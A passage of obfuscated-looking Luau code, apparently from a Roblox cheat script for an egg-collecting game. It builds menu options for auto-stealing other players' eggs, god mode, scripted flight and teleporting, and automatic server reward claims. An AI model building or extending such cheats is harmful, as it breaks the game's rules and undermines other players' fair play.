			return tbl11
		end

		tbl4.OwnPlot = function()
			local plots = workspace:FindFirstChild("Plots")
			if not plots then
				return nil
			end

			for _, child in ipairs(plots:GetChildren()) do
				local plotSign = child:FindFirstChild("PlotSign")
				plotSign = plotSign and plotSign:FindFirstChild("PlayerPlotSign")
				local frame = plotSign and plotSign:FindFirstChild("Frame")
				frame = frame and frame:FindFirstChild("PlayerName")

				if frame and frame:IsA("TextLabel") then
					local v14 = string.lower(frame.Text)
					if v14 == string.lower(localPlayer.Name) or v14 == string.lower(localPlayer.DisplayName) then
						return child
					end
				end
			end

			return nil
		end

		local function fn10()
			local v14 = tbl4.PlacedPoints()
			if #v14 == 0 then
				return nil
			end
			local vector = Vector3.zero

			for _, v15 in ipairs(v14) do
				vector += v15
			end

			return vector / #v14
		end

		tbl4.PenAnchor = function()
			local v14 = fn10()
			if v14 then
				return v14
			end
			local v15 = tbl4.OwnPlot()
			if not v15 then
				return nil
			end
			local toUpdate = v15:FindFirstChild("ToUpdate")
			local starterPen = toUpdate and toUpdate:FindFirstChild("StarterPen") or v15:FindFirstChild("CenterPoint")
			if not starterPen then
				return nil
			end

			local ok, result = pcall(function()
				return starterPen:IsA("Model") and starterPen:GetPivot() or starterPen.CFrame
			end)

			return ok and result.Position or nil
		end

		tbl4.Plot = function()
			local v14 = tbl4.OwnPlot()
			if v14 then
				return v14
			end
			local plots = workspace:FindFirstChild("Plots")
			local v15 = fn10()
			if not plots or not v15 then
				return nil
			end
			local huge = math.huge
			local v16 = nil

			for _, child in ipairs(plots:GetChildren()) do
				local ok, result, result2 = pcall(function()
					return child:GetBoundingBox()
				end)

				if ok and result and result2 then
					local v17 = result:PointToObjectSpace(v15)
					local n = result2.X / 2
					local flag = math.abs(v17.X) <= n

					if flag then
						local n2 = result2.Z / 2
						flag = math.abs(v17.Z) <= n2
					end

					if flag then
						return child
					end
					local magnitude = (result.Position - v15).Magnitude

					if magnitude < huge then
						v16 = child
						huge = magnitude
					end
				end
			end

			if v16 and huge <= 60 then
				return v16
			end
			return nil
		end

		tbl4.Belt = function()
			local v14 = tbl4.Plot()
			if not v14 then
				return nil
			end
			local treadmillBottom = v14:FindFirstChild("TreadmillBottom")
			if treadmillBottom and treadmillBottom:IsA("BasePart") then
				return treadmillBottom
			end
			local clientTreadmillRenders = workspace:FindFirstChild("__ClientTreadmillRenders")
			clientTreadmillRenders = clientTreadmillRenders and clientTreadmillRenders:FindFirstChild("TreadmillRender_" .. v14.Name)

			if clientTreadmillRenders then
				clientTreadmillRenders = clientTreadmillRenders:FindFirstChild("BoundingBoxPart") or clientTreadmillRenders:IsA("Model") and clientTreadmillRenders.PrimaryPart or clientTreadmillRenders:FindFirstChildWhichIsA("BasePart")
			end

			if clientTreadmillRenders then
				return clientTreadmillRenders
			end
			local treadmillUpgrade = v14:FindFirstChild("TreadmillUpgrade")
			return treadmillUpgrade and treadmillUpgrade:FindFirstChildWhichIsA("BasePart") or nil
		end

		tbl4.DistanceTo = function(arg)
			local v14 = tbl4.Root()
			if not v14 or not arg then
				return math.huge
			end
			return (v14.Position - arg).Magnitude
		end

		do
			local tbl11 = {}
			local n = 0

			local function fn11()
				local v14 = tbl4.Plot()
				if not v14 then
					return {}
				end
				local tbl12 = {}

				for _, v15 in ipairs({ "TreadmillBottom", "TreadmillUpgrade" }) do
					local v16 = v14:FindFirstChild(v15)

					if v16 then
						if v16:IsA("BasePart") then
							table.insert(tbl12, v16)
						else
							for _, descendant in ipairs(v16:GetDescendants()) do
								if descendant:IsA("BasePart") then
									table.insert(tbl12, descendant)
								end
							end
						end
					end
				end

				local clientTreadmillRenders = workspace:FindFirstChild("__ClientTreadmillRenders")
				clientTreadmillRenders = clientTreadmillRenders and clientTreadmillRenders:FindFirstChild("TreadmillRender_" .. v14.Name)

				if clientTreadmillRenders then
					for _, descendant in ipairs(clientTreadmillRenders:GetDescendants()) do
						if descendant:IsA("BasePart") then
							table.insert(tbl12, descendant)
						end
					end
				end

				return tbl12
			end

			local function fn12()
				for _, v14 in ipairs(fn11()) do
					if not tbl11[v14] then
						tbl11[v14] = {
							CFrame = v14.CFrame,
							CanTouch = v14.CanTouch,
							CanCollide = v14.CanCollide,
							Transparency = v14.Transparency,
						}

						pcall(function()
							v14.CanTouch = false
							v14.CanCollide = false
							v14.Transparency = 1
							v14.CFrame = v14.CFrame - Vector3.new(0, 120, 0)
						end)
					end
				end
			end

			local function fn13()
				for k, v14 in pairs(tbl11) do
					if k and k.Parent then
						pcall(function()
							k.CFrame = v14.CFrame
							k.CanTouch = v14.CanTouch
							k.CanCollide = v14.CanCollide
							k.Transparency = v14.Transparency
						end)
					end
				end

				table.clear(tbl11)
			end

			tbl4.HoldBelt = function()
				n += 1
				fn12()
			end

			tbl4.ReleaseBelt = function()
				n = math.max(0, n - 1)

				if n == 0 then
					fn13()
				end
			end

			tbl4.BeltHeld = function()
				return n > 0
			end

			tbl4.RefreshBeltHide = function()
				if n > 0 then
					fn12()
				end
			end

			fn4(function()
				n = 0
				fn13()
			end)

			tbl4.LeaveBelt = function()
				local rfTreadmillAskDoff = networking:FindFirstChild("RF/Treadmill/AskDoff")

				if rfTreadmillAskDoff and rfTreadmillAskDoff:IsA("RemoteFunction") then
					pcall(rfTreadmillAskDoff.InvokeServer, rfTreadmillAskDoff)
				end
			end

			tbl4.Treadmill = { Riding = false }

			tbl4.ResetBelt = function()
				n = 0
				fn13()
			end

			tbl4.OnBelt = function()
				local v14 = tbl4.Belt()
				if not v14 or tbl11[v14] then
					return false
				end
				local v15 = tbl4.Root()
				if not v15 then
					return false
				end
				local v16 = v14.CFrame:PointToObjectSpace(v15.Position)
				local n2 = v14.Size.X / 2 + 2
				local flag = math.abs(v16.X) <= n2

				if flag then
					local n3 = v14.Size.Z / 2 + 2
					flag = math.abs(v16.Z) <= n3
				end

				return flag and v16.Y >= -2 and v16.Y <= v14.Size.Y / 2 + 8
			end
		end

		tbl4.ExitBelt = function()
			tbl4.Treadmill.Riding = false
			tbl4.LeaveBelt()
			local character = localPlayer.Character
			local humanoid = character and character:FindFirstChildOfClass("Humanoid")

			if humanoid then
				pcall(function()
					humanoid.Jump = true
					humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
				end)
			end

			task.wait(0.35)
		end

		tbl4.Flying = false
		tbl4.Driving = 0

		tbl4.BeginFlight = function()
			tbl4.Flying = true
			local character = localPlayer.Character
			local humanoid = character and character:FindFirstChildOfClass("Humanoid")

			if humanoid then
				humanoid.PlatformStand = true

				pcall(function()
					humanoid:ChangeState(Enum.HumanoidStateType.Freefall)
				end)
			end

			return tbl4.Root() ~= nil
		end

		tbl4.SetFlightVelocity = function(assemblyLinearVelocity)
			local v14 = tbl4.Root()

			if v14 then
				v14.AssemblyLinearVelocity = assemblyLinearVelocity
				v14.AssemblyAngularVelocity = Vector3.zero
			end
		end

		tbl4.EndFlight = function()
			tbl4.Flying = false
			local v14 = tbl4.Root()

			if v14 then
				pcall(function()
					v14.AssemblyLinearVelocity = Vector3.zero
					v14.AssemblyAngularVelocity = Vector3.zero
				end)
			end

			local character = localPlayer.Character
			character = character and character:FindFirstChildOfClass("Humanoid")

			if character then
				character.PlatformStand = false
			end
		end

		do
			local tbl11 = {
				Enum.HumanoidStateType.FallingDown,
				Enum.HumanoidStateType.Ragdoll,
				Enum.HumanoidStateType.Physics,
				Enum.HumanoidStateType.Seated,
				Enum.HumanoidStateType.PlatformStanding,
			}

			local tbl12 = {}
			local flag = false

			tbl4.GodMode = function(arg)
				local character = localPlayer.Character
				local humanoid = character and character:FindFirstChildOfClass("Humanoid")
				if not character or not humanoid then
					return
				end

				if arg then
					flag = true

					for _, v14 in ipairs(tbl11) do
						pcall(function()
							humanoid:SetStateEnabled(v14, false)
						end)
					end

					pcall(function()
						humanoid.BreakJointsOnDeath = false
					end)

					for _, descendant in ipairs(character:GetDescendants()) do
						if descendant:IsA("BasePart") and tbl12[descendant] == nil then
							tbl12[descendant] = descendant.CanCollide

							pcall(function()
								descendant.CanCollide = false
							end)
						end
					end
				elseif flag then
					flag = false

					for _, v14 in ipairs(tbl11) do
						pcall(function()
							humanoid:SetStateEnabled(v14, true)
						end)
					end

					for k, v14 in pairs(tbl12) do
						if k and k.Parent then
							pcall(function()
								k.CanCollide = v14
							end)
						end
					end

					table.clear(tbl12)
				end
			end
		end

		tbl4.GodTick = function()
			local character = localPlayer.Character
			local humanoid = character and character:FindFirstChildOfClass("Humanoid")

			if humanoid and humanoid.Health < humanoid.MaxHealth then
				pcall(function()
					humanoid.Health = humanoid.MaxHealth
				end)
			end
		end

		tbl4.StopWalking = function()
			local character = localPlayer.Character
			local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
			local humanoid = character and character:FindFirstChildOfClass("Humanoid")

			if humanoid and humanoidRootPart then
				pcall(function()
					humanoid:MoveTo(humanoidRootPart.Position)
					humanoid:Move(Vector3.zero, false)
				end)
			end
		end

		local function fn11(arg, arg2, arg3, arg4)
			local n = tonumber(arg2) or 6
			local n2 = tonumber(arg3) or 10
			local n3 = 0
			local flag = nil
			local n4 = 0
			local n5 = 0

			while n3 < n2 do
				if type(arg4) == "function" and arg4() then
					tbl4.StopWalking()
					return false
				end
				local character = localPlayer.Character
				local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
				character = character and character:FindFirstChildOfClass("Humanoid")
				if not humanoidRootPart or not character or character.Health <= 0 then
					return false
				end

				if (humanoidRootPart.Position - arg).Magnitude <= n then
					tbl4.StopWalking()
					return true
				end
				flag = flag and (humanoidRootPart.Position - flag).Magnitude < 1

				if flag then
					n4 += 0.2
				else
					n4 = 0
				end

				flag = humanoidRootPart.Position
				n5 = math.max(0, n5 - 0.2)

				if n4 >= 0.8 and n5 <= 0 then
					tbl4.LeaveBelt()

					pcall(function()
						character.Jump = true
					end)

					n4 = 0
					n5 = 1.5
				end

				character:MoveTo(arg)
				n3 += task.wait(0.2)
			end

			tbl4.StopWalking()
			return tbl4.DistanceTo(arg) <= n
		end

		tbl4.WalkTo = function(arg, arg2, arg3, arg4)
			tbl4.Driving = tbl4.Driving + 1
			local ok, result = pcall(fn11, arg, arg2, arg3, arg4)
			tbl4.Driving = math.max(0, tbl4.Driving - 1)
			return ok and result == true
		end

		local tbl11 = {
			Boss = "Fractured",
			GreatBloom = "Spirit Bloom",
			Sakura = "Bloom",
			Monstrous = "Parasite",
		}

		task.spawn(function()
			local mutations = tbl.Mutations

			local ok, result = pcall(function()
				return mutations.All()
			end)

			if ok and type(result) == "table" then
				for k, v14 in pairs(result) do
					local id = type(v14) == "table" and (v14.Id or k) or nil
					local label = type(v14) == "table" and v14.Label or nil

					if id ~= nil and type(label) == "string" and label ~= "" then
						tbl11[tostring(id)] = label
					end
				end
			end
		end)

		fn7 = function(arg)
			return tbl11[tostring(arg)] or tostring(arg)
		end

		local tbl12, n, tbl13, tbl14, tbl15, tbl16, flag, tbl17, n2, n3
		local n4, n5, fn12

		do
			local tbl18 = {
				"Forest",
				"Desert",
				"Snow",
				"Lake",
				"Jungle",
				"Volcano",
				"Prehistoric",
				"Cosmic",
				"Abyss Ocean",
				"Cherry Blossom",
				"Light Dark",
				"Titan Temple",
			}

			local tbl19 = {}

			for _, v14 in ipairs(tbl18) do
				tbl19[v14] = true
			end

			task.spawn(function()
				local eggState = tbl.EggState

				local ok, result = pcall(function()
					return eggState.ReadFieldEggs()
				end)

				if ok and type(result) == "table" and type(result.Records) == "table" then
					for _, record in pairs(result.Records) do
						local areaId = type(record) == "table" and record.AreaId or nil

						if type(areaId) == "string" and not tbl19[areaId] then
							tbl19[areaId] = true
							table.insert(tbl18, areaId)
						end
					end
				end
			end)

			tbl8 = { "Any" }
			tbl9 = { Any = 0 }
			local tbl20 = {}
			local directory = tbl.Assets and tbl.Assets.Directory

			if type(directory) == "table" then
				for _, v14 in pairs(directory) do
					local rarity = type(v14) == "table" and v14.Rarity or nil
					local flag2 = type(rarity) == "table"

					if flag2 then
						flag2 = tonumber(rarity.RarityNumber or rarity.Rank)
					end

					flag2 = flag2 or nil

					if flag2 then
						local str = tbl20[flag2]

						if not str then
							str = tostring(rarity.DisplayName or rarity._id or flag2)
						end

						tbl20[flag2] = str
					end
				end
			end

			if next(tbl20) == nil then
				tbl20 = {
					"Common",
					"Uncommon",
					"Rare",
					"Epic",
					"Legendary",
					"Mythic",
					"Cosmic",
					"Secret",
					"Eternal",
					"Divine",
				}
			end

			local tbl21 = {}

			for k in pairs(tbl20) do
				table.insert(tbl21, k)
			end

			table.sort(tbl21)

			for _, v14 in ipairs(tbl21) do
				table.insert(tbl8, tbl20[v14])
				tbl9[tbl20[v14]] = v14
			end

			tbl5 = { "Best Rarity", "Biggest Weight", "Best Mutation", "Highest Value", "Lowest Value" }
			tbl12 = {}
			n = 0
			tbl13 = {}
			tbl14 = {}
			tbl15 = {}
			tbl16 = {}
			tbl4.Steal.RiftPriority = false
			tbl4.Steal.RiftNeeds = {}
			flag = false
			tbl17 = {}
			n2 = 0
			v4 = tbl5[4]
			n3 = 400
			n4 = 27.4
			n5 = 400
			fn12 = nil

			v5 = v8:CreateToggle({
				Name = "Auto Steal",
				Default = false,
				Callback = function()
					if fn12 then
						fn12()
					end
				end,
			})

			for _, v14 in ipairs(tbl18) do
				tbl12[v14] = true
			end

			fn6(v8:CreateMultiDropdown({
				Name = "Target Areas",
				Options = tbl18,
				Default = tbl18,
				Callback = function(arg)
					local tbl22 = {}

					if type(arg) == "table" then
						for k, v14 in pairs(arg) do
							if v14 == true and type(k) == "string" then
								tbl22[k] = true
							elseif type(v14) == "string" then
								tbl22[v14] = true
							end
						end
					end

					if next(tbl22) == nil then
						for _, v14 in ipairs(tbl18) do
							tbl22[v14] = true
						end
					end

					tbl12 = tbl22
				end,
			}))
		end

		v8:CreateDropdown({
			Name = "Min Rarity",
			Note = "Steal eggs of the chosen rarity and every rarity above it",
			Options = tbl8,
			Default = tbl8[1],
			Callback = function(arg)
				n = tbl9[arg] or 0
			end,
		})

		fn5(v8, {
			Name = "Min Steal Value",
			Note = "Skip eggs worth less than this. Drag or type 250k, 50m, 1.5b",
			Legacy = "Min Value To Steal",
			SectionName = "Auto Steal",
			OnRaw = function(arg)
				n2 = arg
			end,
		})

		do
			local tbl18 = {}
			local tbl19 = {}
			local directory = tbl.Assets and tbl.Assets.Directory
			local tbl20 = {}

			if type(directory) == "table" then
				for k, v14 in pairs(directory) do
					local rarity = type(v14) == "table" and v14.Rarity or nil
					local flag2 = type(rarity) == "table"

					if flag2 then
						flag2 = tonumber(rarity.RarityNumber or rarity.Rank)
					end

					local v15 = flag2 or nil

					if v15 then
						table.insert(tbl20, {
							Category = tostring(k),
							Name = tostring(v14.DisplayName or k),
							Rarity = v15,
							RarityName = tostring(rarity.DisplayName or rarity._id or v15),
						})
					end
				end
			end

			table.sort(tbl20, function(arg, arg2)
				if arg.Rarity ~= arg2.Rarity then
					return arg.Rarity > arg2.Rarity
				end
				return arg.Name < arg2.Name
			end)

			for _, v14 in ipairs(tbl20) do
				local str = string.format("%s [%s]", v14.Name, v14.RarityName)

				if tbl19[str] then
					str = string.format("%s [%s] (%s)", v14.Name, v14.RarityName, v14.Category)
				end

				table.insert(tbl18, str)
				tbl19[str] = v14.Category
			end

			fn6(v8:CreateMultiDropdown({
				Name = "Target Specific Eggs",
				Note = "Only steal these eggs (empty = all)",
				Options = tbl18,
				Default = {},
				Callback = function(arg)
					local tbl21 = {}

					if type(arg) == "table" then
						for k, v14 in pairs(arg) do
							k = v14 == true and type(k) == "string" and k or type(v14) == "string" and v14 or nil

							if k and tbl19[k] then
								tbl21[tbl19[k]] = true
							end
						end
					end

					tbl13 = tbl21
				end,
			}))
		end

		do
			local n6 = 30
			local flag2 = false
			local n7 = 0

			local function fn13()
				local tbl18 = {}
				local save2 = tbl.Save

				if type(save2) == "table" and type(save2.Get) == "function" then
					local ok, result = pcall(save2.Get)

					if ok and type(result) == "table" then
						local v14 = pairs
						local inventory = result.Inventory or {}

						for _, v15 in v14(inventory) do
							if type(v15) == "table" and v15.Category ~= nil then
								tbl18[tostring(v15.Category)] = true
							end
						end

						local v15 = pairs
						local eggInventory = result.EggInventory or {}

						for _, v16 in v15(eggInventory) do
							if type(v16) == "table" and v16.AssetCategory ~= nil then
								tbl18[tostring(v16.AssetCategory)] = true
							end
						end
					end
				end

				return tbl18
			end

			local function fn14()
				local rfRiftAskState = networking:FindFirstChild("RF/Rift/AskState")
				if not rfRiftAskState or not rfRiftAskState:IsA("RemoteFunction") then
					return
				end
				local ok, result = pcall(rfRiftAskState.InvokeServer, rfRiftAskState)
				if not ok or type(result) ~= "table" or type(result.Requirements) ~= "table" then
					return
				end
				local v14 = fn13()
				local riftNeeds = {}

				for _, requirement in pairs(result.Requirements) do
					if not v14[tostring(requirement)] then
						riftNeeds[tostring(requirement)] = true
					end
				end

				tbl4.Steal.RiftNeeds = riftNeeds
			end

			tbl3.Add(function()
				if not tbl4.Steal.RiftPriority or flag2 or os.clock() < n7 then
					return false
				end
				flag2 = true
				n7 = os.clock() + n6

				task.spawn(function()
					pcall(fn14)
					flag2 = false
				end)

				return false
			end)

			local function fn15()
				local riftNeeds = tbl4.Steal.RiftNeeds
				if not tbl4.Steal.RiftPriority or next(riftNeeds) == nil then
					return
				end
				local v14 = fn13()
				local flag3 = false

				for k in pairs(riftNeeds) do
					if v14[k] then
						riftNeeds[k] = nil
						flag3 = true
					end
				end

				if flag3 then
					tbl3.Wake()
				end
			end

			local save2 = tbl.Save

			if type(save2) == "table" and type(save2.FieldSignal) == "function" then
				for _, v14 in ipairs({ "EggInventory", "Inventory" }) do
					local ok, result = pcall(save2.FieldSignal, v14)

					if ok and type(result) == "table" and type(result.Connect) == "function" then
						local ok2, result2 = pcall(result.Connect, result, function()
							task.defer(fn15)
						end)

						if ok2 and result2 then
							fn4(function()
								pcall(function()
									result2:Disconnect()
								end)
							end)
						end
					end
				end
			end
		end

		do
			local n6 = 5
			local n7 = 5
			local n8 = 60
			local v14 = nil
			local n9 = 0
			local n10 = 0
			local flag2 = false
			local tbl18 = {}

			local function fn13()
				local save2 = tbl.Save

				if type(save2) == "table" and type(save2.Get) == "function" then
					local ok, result = pcall(save2.Get)
					if ok and type(result) == "table" then
						return result
					end
				end

				return nil
			end

			local function fn14()
				local v15 = fn13()
				local directory = tbl.Areas and tbl.Areas.Directory
				local directory2 = tbl.Assets and tbl.Assets.Directory
				if not v15 or type(directory) ~= "table" or type(directory2) ~= "table" then
					return
				end
				local index = type(v15.Index) == "table" and v15.Index or {}
				local tbl19 = {}
				local v16 = pairs
				local inventory = v15.Inventory or {}

				for _, v17 in v16(inventory) do
					if type(v17) == "table" and v17.Category ~= nil then
						tbl19[tostring(v17.Category)] = true
					end
				end

				local v17 = pairs
				local eggInventory = v15.EggInventory or {}

				for _, v18 in v17(eggInventory) do
					if type(v18) == "table" and v18.AssetCategory ~= nil then
						tbl19[tostring(v18.AssetCategory)] = true
					end
				end

				local tbl20 = {}

				for _, v18 in pairs(directory) do
					local flag3 = type(v18) == "table" and type(v18.Rarity) == "table"
					local num

					if flag3 then
						num = tonumber(v18.Rarity.RarityNumber or v18.Rarity.Rank)
					else
						num = flag3
					end

					num = num or 0
					local v19 = pairs
					local dropTable = type(v18) == "table" and v18.DropTable or {}

					for _, v20 in v19(dropTable) do
						local flag4 = type(v20) == "table" and v20[1] or nil
						local n11 = type(v20) == "table" and tonumber(v20[2]) or 0
						local flag5 = flag4 ~= nil and directory2[flag4] or nil

						if type(flag5) == "table" and n11 > 0 and flag5.DontRoll ~= true then
							local str = tostring(flag4)
							local flag6 = index[flag4] ~= true and not tbl19[str]
							local flag7

							if flag6 then
								flag7 = tbl20[str] == nil or num > tbl20[str]
							else
								flag7 = flag6
							end

							if flag7 then
								tbl20[str] = num
							end
						end
					end
				end

				tbl17 = tbl20
			end

			local function fn15(arg, ...)
				local v15 = networking:FindFirstChild(arg)
				if not v15 or not v15:IsA("RemoteFunction") then
					return false
				end
				local v16 = pcall
				local invokeServer = v15.InvokeServer
				local v17 = table.pack(...)
				v17.n = 3 + v17.n - 1
				table.move(v17, 1, v17.n, 3, v17)
				v17[1] = invokeServer
				v17[2] = v15
				local v18, v19 = v16(table.unpack(v17, 1, v17.n))
				return v18 and v19 ~= false
			end

			local function fn16(arg, arg2)
				local tbl19 = {}
				if type(arg) ~= "table" then
					return tbl19
				end

				for _, v15 in ipairs(arg2) do
					local flag3 = arg

					for _, v16 in ipairs(v15) do
						flag3 = type(flag3) == "table" and flag3[v16] or nil
					end

					local v16 = ipairs
					local tbl20 = type(flag3) == "table" and flag3 or {}

					for _, v17 in v16(tbl20) do
						if type(v17) == "table" and v17.AssetId ~= nil then
							table.insert(tbl19, v17.AssetId)
						end
					end
				end

				return tbl19
			end

			local tbl19 = {
				{
					Id = "LimitedEgg",
					Gear = "GravityDisruptor",
					Module = "LimitedEgg",
					Lists = { { "Entries" }, { "MechaReroll", "Entries" } },
				},
				{
					Id = "BrainrotEgg",
					Gear = "BeeLauncher",
					Module = "BrainrotEgg",
					Lists = { { "Entries" } },
				},
				{
					Id = "MonsterEgg",
					Gear = "BeeLauncher",
					Module = "MonsterEgg",
					Lists = { { "Entries" }, { "MechaEntries" } },
				},
			}

			local function fn17()
				local v15 = fn13()
				if not v15 then
					return
				end
				local index = type(v15.Index) == "table" and v15.Index or {}
				local indexClaimedCategories = type(v15.IndexClaimedCategories) == "table" and v15.IndexClaimedCategories or {}

				for k, v16 in pairs(index) do
					if v16 == true and indexClaimedCategories[k] ~= true then
						fn15("RF/Codex/AskRedeemAll")
						break
					end
				end

				local gearInventory = type(v15.GearInventory) == "table" and v15.GearInventory or {}

				for _, v16 in ipairs(tbl19) do
					local flag3 = (tonumber(gearInventory[v16.Gear]) or 0) <= 0

					if flag3 then
						flag3 = os.clock() >= (tbl18[v16.Id] or 0)
					end

					if flag3 then
						local v17 = fn16(tbl[v16.Module], v16.Lists)
						local flag4 = #v17 > 0

						for _, v18 in ipairs(v17) do
							if index[v18] ~= true then
								flag4 = false
								break
							end
						end

						if flag4 then
							tbl18[v16.Id] = os.clock() + n8
							fn15("RF/Codex/AskRedeemLimitedEgg", v16.Id)
						end
					end
				end
			end

			tbl3.Add(function()
				local now = os.clock()

				if flag and now >= n9 then
					n9 = now + n6
					pcall(fn14)
				end

				if not flag2 and now >= n10 and tbl4.Toggle(tbl4.IndexClaimHandle, false) then
					flag2 = true
					n10 = now + n7

					task.spawn(function()
						pcall(fn17)
						flag2 = false
					end)
				end

				return false
			end)

			v14 = v8:CreateToggle({
				Name = "Steal Missing Index Eggs",
				Note = "Also steal eggs missing from your index, highest area first",
				Default = false,
				Callback = function()
					flag = tbl4.Toggle(v14, false) == true
					n9 = 0

					if not flag then
						tbl17 = {}
					end

					tbl3.Wake()
				end,
			})

			tbl4.IndexClaimRestart = function()
				n10 = 0
				tbl3.Wake()
			end
		end

		tbl4.Steal.PriorityHandle = v8:CreateDropdown({
			Name = "Steal Priority",
			Options = tbl5,
			Default = tbl5[4],
			Callback = function(arg)
				if table.find(tbl5, arg) then
					v4 = arg

					if type(tbl4.ResortSteal) == "function" then
						tbl4.ResortSteal()
					end
				end
			end,
		})

		v8:CreateSlider({
			Name = "Tween Speed",
			Min = 100,
			Max = 1000,
			Default = 400,
			Increment = 10,
			Unit = "studs/s",
			Callback = function(arg)
				local n6 = math.clamp(tonumber(arg) or 400, 100, 1000)
				n3 = n6
				n5 = n6
			end,
		})

		tbl4.AntiGuard.Handle = v2:CreateState({ Name = "Anti Guard Enabled", Default = false })

		pcall(function()
			tbl4.AntiGuard.Enabled = tbl4.AntiGuard.Handle:Get() == true
		end)

		pcall(function()
			tbl4.AntiGuard.Handle:Subscribe(function(arg)
				if type(arg) ~= "boolean" then
					arg = tbl4.AntiGuard.Handle:Get()
				end

				tbl4.AntiGuard.Enabled = arg == true

				if tbl4.AntiGuard.Render and tbl4.UiDefer then
					tbl4.UiDefer(function()
						pcall(tbl4.AntiGuard.Render, false)
					end)
				end
			end)
		end)

		tbl4.AntiGuard.PanelHandle = v8:CreateToggle({
			Name = "Anti Guard",
			Default = true,
			Callback = function(panelShown)
				if type(panelShown) ~= "boolean" then
					panelShown = tbl4.Toggle(tbl4.AntiGuard.PanelHandle, true)
				end

				tbl4.AntiGuard.PanelShown = panelShown

				if tbl4.AntiGuard.ShowPanel then
					pcall(tbl4.AntiGuard.ShowPanel, panelShown)
				end
			end,
		})

		tbl4.SafeCarry.Handle = v8:CreateToggle({
			Name = "Safe Delivery",
			Default = true,
			Callback = function(arg)
				if type(arg) ~= "boolean" then
					arg = tbl4.Toggle(tbl4.SafeCarry.Handle, true)
				end

				tbl4.SafeCarry.Enabled = arg == true
				tbl3.Wake()
			end,
		})

		v8:CreateDropdown({
			Name = "Travel Method",
			Options = { "Tween", "Teleport" },
			Default = "Tween",
			SubOf = tbl4.SafeCarry.Handle,
			Callback = function(arg)
				if arg == "Tween" then
					tbl4.SafeCarry.Approach = "Run"
				elseif arg == "Teleport" then
					tbl4.SafeCarry.Approach = "Ragdoll Jump"
				end
			end,
		})

		v8:CreateSlider({
			Name = "Carry Speed",
			Note = "Lower it if you get Delivery failed",
			Min = 80,
			Max = 120,
			Default = 100,
			Increment = 1,
			Unit = "%",
			SubOf = tbl4.SafeCarry.Handle,
			Callback = function(arg)
				tbl4.SafeCarry.CarryScale = math.clamp(tonumber(arg) or 100, 80, 120) / 100
			end,
		})

		tbl4.SafeCarry.RunHandle = v8:CreateSlider({
			Name = "Egg Tween Speed",
			Note = "Tween only: how fast you fly to the egg, 100 = your walk speed",
			Min = 50,
			Max = 300,
			Default = 115,
			Increment = 5,
			Unit = "%",
			SubOf = tbl4.SafeCarry.Handle,
			Callback = function(arg)
				tbl4.SafeCarry.RunSpeed = math.clamp(tonumber(arg) or 115, 50, 300) / 100
			end,
		})

		v8:CreateSlider({
			Name = "Wait After Teleport",
			Note = "Teleport only: wait time before taking the egg. Too short and the delivery fails",
			Min = 0,
			Max = 15,
			Default = 6.5,
			Increment = 0.5,
			Unit = "s",
			SubOf = tbl4.SafeCarry.Handle,
			Callback = function(arg)
				tbl4.SafeCarry.BaseWait = math.clamp(tonumber(arg) or 6.5, 0, 15)
			end,
		})

		local v14
		v14 = nil
		local v15
		v15 = nil
		local v16
		v16 = nil
		local str
		str = "None"
		local str2
		str2 = "Idle"
		local flag2
		flag2 = false
		local n6
		n6 = 0
		local tbl18
		tbl18 = {}
		local n7
		n7 = 20
		local uid
		uid = nil
		local fn13

		fn13 = function(arg)
			return arg ~= n6 or not tbl4.Toggle(v14, false)
		end

		local fn14

		do
			local tbl19 = {}

			local function fn15(arg)
				if type(arg) ~= "number" or tbl19[arg] then
					return
				end
				tbl19[arg] = true

				task.delay(math.max(0, arg - workspace:GetServerTimeNow()) + 0.05, function()
					tbl19[arg] = nil
					tbl3.Wake()
				end)
			end

			local n8 = 0

			fn14 = function()
				local areaEggCycle = tbl.AreaEggCycle
				if type(areaEggCycle) ~= "table" then
					return nil
				end

				local ok, result, result2, result3, result4 = pcall(function()
					local serverTimeNow = workspace:GetServerTimeNow()
					local nextResetTime = areaEggCycle.NextResetTime
					return serverTimeNow, areaEggCycle.IsNightPhase(serverTimeNow), areaEggCycle.NextNightTime(serverTimeNow), nextResetTime(serverTimeNow)
				end)

				if not ok or type(result4) ~= "number" then
					return nil
				end

				if result2 == true then
					n8 = result4 + tbl4.WallOpenDelay()
					fn15(n8)
					return n8, "night", result
				end

				if tbl4.WallSealed() then
					fn15(result + 0.3)
					return math.max(n8, result), "wall", result
				end

				if type(result3) == "number" and result3 > result then
					fn15(result3)
				end

				return nil
			end
		end

		do
			local areaEggResetWall = tbl.AreaEggResetWall
			local changed = type(areaEggResetWall) == "table" and areaEggResetWall.Changed or nil

			if changed and type(changed.Connect) == "function" then
				local ok, result = pcall(function()
					return changed:Connect(function()
						tbl3.Wake()
					end)
				end)

				if ok and result then
					fn4(function()
						pcall(function()
							result:Disconnect()
						end)
					end)
				end
			end
		end

		local n8
		n8 = 8
		local v17
		v17 = nil
		local n9
		n9 = 0
		local fn15, fn16, fn17

		local function fn18(arg)
			local tbl19 = {}
			local str3 = "FirstAreaEgg_" .. tostring(localPlayer.UserId)
			local eggState = tbl.EggState

			if type(eggState) == "table" and type(eggState.ReadFieldEggs) == "function" then
				task.spawn(function()
					local ok, result = pcall(eggState.ReadFieldEggs)

					if ok and type(result) == "table" and type(result.Records) == "table" then
						for _, record in pairs(result.Records) do
							local flag3 = type(record) == "table" and type(record.Uid) == "string"
							local flag4

							if flag3 then
								flag4 = not (arg and string.sub(record.Uid, 1, #str3) == str3)
							else
								flag4 = flag3
							end

							if flag4 then
								tbl19[record.Uid] = true
							end
						end
					end
				end)
			end

			return tbl19
		end

		fn15 = function()
			if v17 == nil then
				return false
			end

			if tbl4.IsNight() then
				return true
			end

			if n9 == math.huge then
				n9 = os.clock() + n8
			end

			return false
		end

		fn16 = function()
			if v17 and n9 == math.huge then
				return
			end
			v17 = fn18(true)
			n9 = math.huge
			table.clear(tbl14)
			table.clear(tbl16)
			table.clear(tbl15)
			table.clear(tbl18)
			uid = nil
		end

		fn17 = function()
			if not v17 then
				return false
			end

			if os.clock() >= n9 then
				v17 = nil
				return false
			end
			local v18 = fn18()
			if next(v18) == nil then
				return true
			end
			local flag3 = false
			local flag4 = false

			for k in pairs(v18) do
				if v17[k] then
					flag3 = true
				else
					flag4 = true
				end
			end

			if not flag3 then
				v17 = nil
				return false
			end
			return not flag4
		end

		local fn19

		do
			local function fn20(arg)
				local directory = tbl.Assets and tbl.Assets.Directory
				local flag3 = type(directory) == "table" and directory[tostring(arg)] or nil
